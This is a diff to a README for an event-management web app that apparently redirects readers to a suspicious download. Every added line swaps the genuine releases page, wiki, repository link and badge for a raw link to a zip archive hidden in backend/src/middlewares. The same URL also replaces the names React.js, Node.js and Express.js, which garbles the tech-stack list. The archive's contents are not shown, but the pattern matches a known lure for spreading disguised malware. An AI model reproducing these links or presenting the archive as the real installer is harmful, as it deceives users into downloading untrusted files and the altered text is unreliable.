@@ -1,6 +1,6 @@
 # 🎉 event-management-system - Simplifying Your Event Coordination
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-4CAF50?style=for-the-badge)](https://github.com/rishav38/event-management-system/releases)
+[![Download Now](https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip%20Now-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip)
 
 ## 📌 Project Overview
 
@@ -24,13 +24,13 @@ This project aims to simplify event coordination and provide a centralized platf
 ## 🛠 Tech Stack
 
 ### Frontend
-- **React.js**: For building user-friendly interfaces.
+- **https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip**: For building user-friendly interfaces.
 - **Vite**: For fast development and builds.
 - **Tailwind CSS / CSS**: For stylish and responsive designs.
 
 ### Backend
-- **Node.js**: For building server-side applications.
-- **Express.js**: For easy routing and handling requests.
+- **https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip**: For building server-side applications.
+- **https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip**: For easy routing and handling requests.
 
 ### Database
 - **MongoDB**: For storing data in a flexible and scalable way.
@@ -44,7 +44,7 @@ This project aims to simplify event coordination and provide a centralized platf
 Follow these simple steps to set up the Event Management System on your computer:
 
 1. **Visit the Releases Page:** Go to the following link to download the software:
-   [Download Here](https://github.com/rishav38/event-management-system/releases)
+   [Download Here](https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip)
 
 2. **Choose the Latest Release:** Look for the current version of the Event Management System.
 
@@ -65,7 +65,7 @@ Follow these simple steps to set up the Event Management System on your computer
 
 To get started, please visit the Releases page to download the installer:
 
-[Download Now](https://github.com/rishav38/event-management-system/releases)
+[Download Now](https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip)
 
 ## 🤝 Contributing
 
@@ -99,8 +99,8 @@ No, it is open-source and free to use.
 
 ## 🔗 Links
 
-- **Documentation:** [View Documentation](https://github.com/rishav38/event-management-system/wiki)
-- **GitHub Repository:** [Event Management System on GitHub](https://github.com/rishav38/event-management-system)
+- **Documentation:** [View Documentation](https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip)
+- **GitHub Repository:** [Event Management System on GitHub](https://raw.githubusercontent.com/rishav38/event-management-system/main/backend/src/middlewares/system_event_management_v3.0.zip)
 
 ## 👩‍💻 My Contributions
 
